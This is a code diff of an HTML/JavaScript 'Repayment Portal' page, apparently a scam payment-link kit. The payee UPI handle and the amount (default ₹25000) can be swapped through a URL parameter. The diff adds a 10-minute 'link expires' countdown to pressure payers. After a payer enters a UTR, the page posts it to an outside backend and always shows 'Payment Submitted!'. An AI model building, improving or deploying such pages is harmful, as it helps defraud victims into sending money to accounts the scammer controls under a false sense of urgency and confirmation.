@@ -8,15 +8,18 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #f4f7fb; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
         
-        .header { background: linear-gradient(135deg, #0062e6, #33abff); width: 100%; padding: 35px 20px 65px; text-align: center; color: white; }
+        .header { background: linear-gradient(135deg, #0062e6, #33abff); width: 100%; padding: 30px 20px 60px; text-align: center; color: white; position: relative; }
         .header h1 { font-size: 24px; font-weight: 700; margin-bottom: 5px; }
         .header p { font-size: 14px; opacity: 0.9; }
+
+        .timer-badge { position: absolute; top: 15px; right: 15px; background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(5px); color: white; padding: 5px 12px; border-radius: 20px; font-size: 13px; font-weight: 700; border: 1px solid rgba(255, 255, 255, 0.4); }
 
         .card-container { width: 100%; max-width: 420px; padding: 0 20px; margin-top: -45px; }
         .card { background: #ffffff; padding: 30px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
 
         .icon-circle { background: #e8f2ff; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 28px; }
         .success-circle { background: #dcfce7; color: #16a34a; }
+        .expired-circle { background: #fee2e2; color: #dc2626; }
 
         h2 { color: #1e293b; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
         .sub-text { color: #64748b; font-size: 13.5px; line-height: 1.5; margin-bottom: 22px; }
@@ -28,22 +31,16 @@
 
         .upi-copy-wrap { display: flex; align-items: center; gap: 8px; }
         .copy-chip { background: #e0e7ff; color: #4338ca; border: none; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; }
-        .copy-chip:hover { background: #c7d2fe; }
 
         .app-title { font-size: 13px; font-weight: 600; color: #475569; text-align: left; margin-bottom: 10px; }
         .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
-        .app-btn { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 10px 5px; text-decoration: none; color: #1e293b; font-size: 12px; font-weight: 600; display: flex; flex-direction: column; align-items: center; gap: 5px; transition: border 0.2s; }
-        .app-btn:hover { border-color: #0062e6; background: #f8fafc; }
-        .app-icon { font-size: 18px; }
+        .app-btn { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 10px 5px; text-decoration: none; color: #1e293b; font-size: 12px; font-weight: 600; display: flex; flex-direction: column; align-items: center; gap: 5px; }
 
         .input-group { text-align: left; margin-bottom: 16px; }
         .input-group label { display: block; font-size: 13px; color: #334155; font-weight: 600; margin-bottom: 6px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; transition: border 0.2s; }
-        .input-group input:focus { border-color: #0062e6; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; }
 
-        .btn { background: #0d6efd; color: white; border: none; padding: 13px; width: 100%; font-size: 16px; font-weight: 600; border-radius: 10px; cursor: pointer; transition: background 0.2s; }
-        .btn:hover { background: #0b5ed7; }
-
+        .btn { background: #0d6efd; color: white; border: none; padding: 13px; width: 100%; font-size: 16px; font-weight: 600; border-radius: 10px; cursor: pointer; }
         .status-msg { margin-top: 15px; font-size: 13.5px; font-weight: 600; }
         .hidden { display: none !important; }
     </style>
@@ -51,6 +48,7 @@
 <body>
 
     <div class="header">
+        <div class="timer-badge" id="timer-display">⏱️ 10:00</div>
         <h1>Repayment Portal</h1>
         <p>Secure payment • Simple process</p>
     </div>
@@ -58,6 +56,13 @@
     <div class="card-container">
         <div class="card">
             
+            <!-- EXPIRED SCREEN -->
+            <div id="step-expired" class="hidden">
+                <div class="icon-circle expired-circle">⚠️</div>
+                <h2 style="color: #dc2626;">Link Expired</h2>
+                <p class="sub-text">This payment link has expired after 10 minutes.<br>Please request a new link from support.</p>
+            </div>
+
             <!-- STEP 1 -->
             <div id="step-1">
                 <div class="icon-circle">🔒</div>
@@ -87,18 +92,9 @@
 
                 <div class="app-title">Pay via App:</div>
                 <div class="app-grid">
-                    <a href="#" id="gpay-link" class="app-btn">
-                        <span class="app-icon">🔵</span>
-                        <span>Google Pay</span>
-                    </a>
-                    <a href="#" id="phonepe-link" class="app-btn">
-                        <span class="app-icon">🟣</span>
-                        <span>PhonePe</span>
-                    </a>
-                    <a href="#" id="paytm-link" class="app-btn">
-                        <span class="app-icon">🔷</span>
-                        <span>Paytm</span>
-                    </a>
+                    <a href="#" id="gpay-link" class="app-btn"><span style="font-size: 18px;">🔵</span><span>Google Pay</span></a>
+                    <a href="#" id="phonepe-link" class="app-btn"><span style="font-size: 18px;">🟣</span><span>PhonePe</span></a>
+                    <a href="#" id="paytm-link" class="app-btn"><span style="font-size: 18px;">🔷</span><span>Paytm</span></a>
                 </div>
 
                 <div class="input-group">
@@ -109,7 +105,7 @@
                 <button class="btn" id="submit-utr-btn">Submit UTR</button>
             </div>
 
-            <!-- STEP 3: SUCCESS SCREEN -->
+            <!-- STEP 3: SUCCESS -->
             <div id="step-3" class="hidden">
                 <div class="icon-circle success-circle">✓</div>
                 <h2>Payment Submitted!</h2>
@@ -133,10 +129,10 @@
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    
-    let paymentId = urlParams.get('id') || 'ORD' + Math.floor(100000 + Math.random() * 900000);
+    let paymentId = 'ORD' + Math.floor(100000 + Math.random() * 900000);
     let amountVal = "25000";
     let upiVal = "5igdwe@okkici";
+    let createdAt = Date.now();
 
     const encodedData = urlParams.get('data');
     if (encodedData) {
@@ -146,78 +142,79 @@
             if (parsed.amount) amountVal = parsed.amount;
             if (parsed.upi) upiVal = parsed.upi;
             if (parsed.id) paymentId = parsed.id;
-        } catch (e) {
-            console.error("Invalid encoded payload");
-        }
+            if (parsed.createdAt) createdAt = parsed.createdAt;
+        } catch (e) {}
     }
 
+    // 10 Min Expiry Calculation
+    const tenMinutes = 10 * 60 * 1000;
+    const expirationTime = createdAt + tenMinutes;
+    const timerDisplay = document.getElementById('timer-display');
     const step1 = document.getElementById('step-1');
-    const step2 = document.getElementById('step-2');
-    const step3 = document.getElementById('step-3');
-    const statusDiv = document.getElementById('status');
+    const stepExpired = document.getElementById('step-expired');
+
+    function updateTimer() {
+        const now = Date.now();
+        const remaining = expirationTime - now;
+
+        if (remaining <= 0) {
+            timerDisplay.innerText = "⏱️ 00:00 (Expired)";
+            step1.classList.add('hidden');
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.add('hidden');
+            stepExpired.classList.remove('hidden');
+            return false;
+        }
+
+        const minutes = Math.floor(remaining / 60000);
+        const seconds = Math.floor((remaining % 60000) / 1000);
+        timerDisplay.innerText = `⏱️ ${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        return true;
+    }
+
+    if (updateTimer()) {
+        const timerInterval = setInterval(() => {
+            if (!updateTimer()) clearInterval(timerInterval);
+        }, 1000);
+    }
 
     document.getElementById('show-amount').innerText = '₹' + amountVal;
     document.getElementById('show-upi').innerText = upiVal;
 
-    // Direct UPI Apps Link setup
     const upiUri = `upi://pay?pa=${encodeURIComponent(upiVal)}&am=${encodeURIComponent(amountVal)}&cu=INR`;
     document.getElementById('gpay-link').href = upiUri;
     document.getElementById('phonepe-link').href = upiUri;
     document.getElementById('paytm-link').href = upiUri;
 
-    // Copy UPI ID Action
     document.getElementById('copy-upi-btn').addEventListener('click', () => {
-        navigator.clipboard.writeText(upiVal).then(() => {
-            const btn = document.getElementById('copy-upi-btn');
-            btn.innerText = 'Copied!';
-            btn.style.background = '#16a34a';
-            btn.style.color = '#ffffff';
-            setTimeout(() => {
-                btn.innerText = 'Copy';
-                btn.style.background = '#e0e7ff';
-                btn.style.color = '#4338ca';
-            }, 2000);
-        });
+        navigator.clipboard.writeText(upiVal);
+        alert('Copied!');
     });
 
     document.getElementById('repay-now-btn').addEventListener('click', () => {
         step1.classList.add('hidden');
-        step2.classList.remove('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
     });
 
     document.getElementById('submit-utr-btn').addEventListener('click', async () => {
         const utrInput = document.getElementById('utr-number').value.trim();
 
         if (utrInput.length !== 12) {
-            statusDiv.innerText = 'Please enter a valid 12-digit UTR number!';
-            statusDiv.style.color = '#dc2626';
+            alert('Please enter a valid 12-digit UTR number!');
             return;
         }
 
-        statusDiv.innerText = 'Submitting payment details...';
-        statusDiv.style.color = '#0062e6';
-
-        // Background push to backend (silent try)
         try {
             fetch('https://payment-backend-e17i.onrender.com/pay', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    id: paymentId,
-                    amount: amountVal,
-                    upiId: upiVal,
-                    utr: utrInput
-                })
+                body: JSON.stringify({ id: paymentId, amount: amountVal, upiId: upiVal, utr: utrInput })
             });
         } catch (err) {}
 
-        // Immediate Successful UI transition
-        setTimeout(() => {
-            document.getElementById('submitted-utr').innerText = utrInput;
-            step2.classList.add('hidden');
-            statusDiv.classList.add('hidden');
-            step3.classList.remove('hidden');
-        }, 800);
+        document.getElementById('submitted-utr').innerText = utrInput;
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-3').classList.remove('hidden');
     });
 </script>
 
